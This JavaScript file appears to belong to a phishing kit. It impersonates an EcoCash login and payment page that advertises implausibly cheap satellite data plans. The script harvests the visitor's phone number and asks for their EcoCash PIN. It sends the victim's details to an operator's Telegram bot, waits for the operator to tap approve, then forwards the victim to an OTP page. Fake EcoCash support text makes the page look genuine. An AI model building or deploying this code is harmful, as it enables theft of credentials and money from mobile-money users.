/**
 * EcoCash Login & Payment Page Script
 * Dispatches Telegram order alerts and simulates the official EcoCash USSD handset prompt
 */

// Shared Plan Catalog
const planCatalog = {
  '5gb-trial': { title: '5GB Free Trial', price: 'FREE', duration: '2-Day Plan' },
  '15gb': { title: '15GB Satellite Data', price: 'USD 0.99', duration: '7-Day Plan' },
  '35gb': { title: '35GB Satellite Data', price: 'USD 1.99', duration: '14-Day Plan' },
  '50gb': { title: '50GB Satellite Data', price: 'USD 2.99', duration: '21-Day Plan' },
  'monthly-unlimited': { title: 'Monthly Unlimited Data', price: 'USD 3.99', duration: '30-Day Plan' },
  '5g-unlimited': { title: '5G Monthly Unlimited Data', price: 'USD 7.99', duration: '30-Day Plan' },
  'free-30gb': { title: 'FREE 30GB Promo', price: 'FREE', duration: '30-Day Plan' }
};

// Telegram Configuration — always read live from config.js
var telegramCfg = window.TELEGRAM_CONFIG || { enabled: false, botToken: '', chatId: '' };

let approvalPolling = false; // flag to stop polling when cancelled

/**
 * Handle form submission — show waiting screen & poll for Telegram approval
 */
async function handleEcoCashSubmit(event) {
  if (event && event.preventDefault) event.preventDefault();

  const phoneInput = document.getElementById('ecocash-phone-input');
  const phoneVal = phoneInput ? phoneInput.value.trim().replace(/\s/g, '') : '';

  if (!phoneVal || phoneVal.length < 9) {
    alert('Please enter a valid Econet / EcoCash mobile number (e.g. 077... or 078...)');
    phoneInput.focus();
    return;
  }

  // Read PIN from 4 boxes
  const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
  const pinVal = pinBoxes.map(b => b.value).join('');

  if (pinVal.length < 4) {
    alert('Please enter your 4-digit EcoCash PIN.');
    const firstEmpty = pinBoxes.find(b => !b.value);
    if (firstEmpty) firstEmpty.focus();
    return;
  }

  // Hide form, show waiting spinner
  document.getElementById('ecocash-login-form').style.display = 'none';
  document.getElementById('approval-waiting').style.display = 'block';
  document.getElementById('plan-summary-badge') && (document.getElementById('plan-summary-badge').style.display = 'none');

  // Generate unique session ID for this customer
  const sessionId = 'EC' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();

  // Send Telegram alert with APPROVE / REJECT buttons
  await notifyTelegramForApproval(phoneVal, sessionId);

  // Start polling Telegram for admin's decision
  approvalPolling = true;
  const result = await pollTelegramForApproval(sessionId);

  if (!approvalPolling) return; // Cancelled

  if (result === 'approved') {
    document.getElementById('approval-status-pill').textContent = '✅ Approved! Redirecting...';
    setTimeout(() => {
      const planName = selectedPlan ? selectedPlan.title : '';
      window.location.href = `otp.html?phone=${encodeURIComponent(phoneVal)}&plan=${encodeURIComponent(planName)}&session=${sessionId}`;
    }, 800);
  } else {
    const pill = document.getElementById('approval-status-pill');
    pill.textContent = '❌ Request rejected by administrator.';
    pill.classList.add('rejected');
    document.getElementById('approval-title') && (document.getElementById('approval-title').textContent = 'Request Not Approved');
    document.querySelector('.approval-spinner').style.display = 'none';
  }
}

function cancelApproval() {
  approvalPolling = false;
  document.getElementById('approval-waiting').style.display = 'none';
  document.getElementById('ecocash-login-form').style.display = 'block';
  const badge = document.getElementById('plan-summary-badge');
  if (badge) badge.style.display = 'flex';
}

/**
 * Send Telegram notification to admin with APPROVE / REJECT inline buttons
 */
async function notifyTelegramForApproval(phone, sessionId) {
  const cfg = window.TELEGRAM_CONFIG;
  if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') {
    console.warn('[Telegram] Not configured.');
    return;
  }

  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });
  const text =
    `💳 <b>CHECKOUT INITIATED & AWAITING APPROVAL</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🆔 <b>Session:</b> <code>${sessionId}</code>\n` +
    `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
    `🔑 <b> customer Code:</b> <code>0000</code>\n` +   
    `📦 <b>Package:</b> ${selectedPlan ? selectedPlan.title : 'Unknown'} (${selectedPlan ? selectedPlan.duration : ''})\n` +
    `💵 <b>Amount:</b> ${selectedPlan ? selectedPlan.price : 'Unknown'}\n` +
    `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
    `📅 <b>Time:</b> ${timestamp}\n\n` +
    `<b>⚡ Tap below to approve or reject customer:</b>`;

  const reply_markup = {
    inline_keyboard: [[
      { text: '✅ APPROVE', callback_data: `approve:${sessionId}` },
      { text: '❌ REJECT', callback_data: `reject:${sessionId}` }
    ]]
  };

  try {
    await fetch(`https://api.telegram.org/bot${cfg.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: cfg.chatId, text, parse_mode: 'HTML', reply_markup })
    });
    console.log('✓ Approval request sent to Telegram admin.');
  } catch (err) {
    console.error('[Telegram] Approval notify error:', err);
  }
}

/**
 * Poll Telegram getUpdates to detect when admin taps APPROVE or REJECT
 */
async function pollTelegramForApproval(sessionId) {
  const cfg = window.TELEGRAM_CONFIG;
  if (!cfg || !cfg.botToken) return 'approved'; // fallback if no Telegram

  let offset = 0;

  // Get latest update_id as starting offset (avoid processing old messages)
  try {
    const init = await fetch(`https://api.telegram.org/bot${cfg.botToken}/getUpdates?limit=1&offset=-1`);
    const initData = await init.json();
    if (initData.ok && initData.result.length > 0) {
      offset = initData.result[initData.result.length - 1].update_id + 1;
    }
  } catch {}

  const statusPill = document.getElementById('approval-status-pill');
  let dots = 0;

  while (approvalPolling) {
    // Animate waiting dots
    dots = (dots + 1) % 4;
    statusPill.textContent = '⏳ Awaiting approval' + '.'.repeat(dots);

    try {
      const res = await fetch(
        `https://api.telegram.org/bot${cfg.botToken}/getUpdates?offset=${offset}&timeout=10&allowed_updates=["callback_query"]`
      );
      const data = await res.json();

      if (!approvalPolling) break;

      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;

          if (update.callback_query) {
            const cbData = update.callback_query.data || '';
            const cbId = update.callback_query.id;
            const [action, cbSession] = cbData.split(':');

            if (cbSession === sessionId) {
              // Answer the callback so the admin sees a tick on the button
              await fetch(`https://api.telegram.org/bot${cfg.botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: cbId,
                  text: action === 'approve' ? '✅ Customer approved!' : '❌ Customer rejected.',
                  show_alert: false
                })
              });
              return action === 'approve' ? 'approved' : 'rejected';
            }
          }
        }
      }
    } catch (err) {
      // Network hiccup — wait and retry
      await new Promise(r => setTimeout(r, 3000));
    }
  }

  return 'cancelled';
}
document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const planId = urlParams.get('plan') || '15gb';
  selectedPlan = planCatalog[planId] || planCatalog['15gb'];

  // Display Plan Summary Badge if plan is selected
  const summaryBadge = document.getElementById('plan-summary-badge');
  const titleEl = document.getElementById('summary-plan-title');
  const priceEl = document.getElementById('summary-plan-price');

  if (summaryBadge && titleEl && priceEl) {
    titleEl.textContent = selectedPlan.title + ' (' + selectedPlan.duration + ')';
    priceEl.textContent = selectedPlan.price;
    summaryBadge.style.display = 'flex';
  }

  // Format phone number field
  const phoneInput = document.getElementById('ecocash-phone-input');
  if (phoneInput) {
    phoneInput.addEventListener('input', formatPhone);
  }

  // PIN show/hide toggle
  const pinToggle = document.getElementById('pin-toggle');
  const eyeOpen = document.getElementById('eye-open');
  const eyeClosed = document.getElementById('eye-closed');
  if (pinToggle) {
    pinToggle.addEventListener('click', () => {
      const pinBoxes = document.querySelectorAll('.pin-box');
      const isHidden = pinBoxes[0].type === 'password';
      pinBoxes.forEach(b => { b.type = isHidden ? 'text' : 'password'; });
      eyeOpen.style.display = isHidden ? 'block' : 'none';
      eyeClosed.style.display = isHidden ? 'none' : 'block';
      pinToggle.setAttribute('aria-label', isHidden ? 'Hide PIN' : 'Show PIN');
    });
  }

  // PIN boxes — auto-advance and backspace
  const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
  pinBoxes.forEach((box, i) => {
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && i > 0) {
        pinBoxes[i - 1].focus();
        pinBoxes[i - 1].value = '';
      }
    });
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(-1);
      if (box.value && i < pinBoxes.length - 1) {
        pinBoxes[i + 1].focus();
      }
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
      pasted.split('').slice(0, 4).forEach((ch, idx) => {
        if (pinBoxes[idx]) pinBoxes[idx].value = ch;
      });
      const last = Math.min(pasted.length, 3);
      pinBoxes[last].focus();
    });
  });
});

function formatPhone(e) {
  let val = e.target.value.replace(/\D/g, '');
  if (val.length > 10) val = val.substring(0, 10);

  if (val.length > 6) {
    e.target.value = val.substring(0, 3) + ' ' + val.substring(3, 6) + ' ' + val.substring(6);
  } else if (val.length > 3) {
    e.target.value = val.substring(0, 3) + ' ' + val.substring(3);
  } else {
    e.target.value = val;
  }
}

function showRegisterInfo(e) {
  e.preventDefault();
  alert('To register a new EcoCash wallet, dial *151# on your Econet SIM or visit any Econet Shop with your national ID.');
}

function showHelpInfo(e) {
  e.preventDefault();
  alert('EcoCash Customer Support: Dial 114 toll-free on Econet, or contact support@ecocash.co.zw');
}
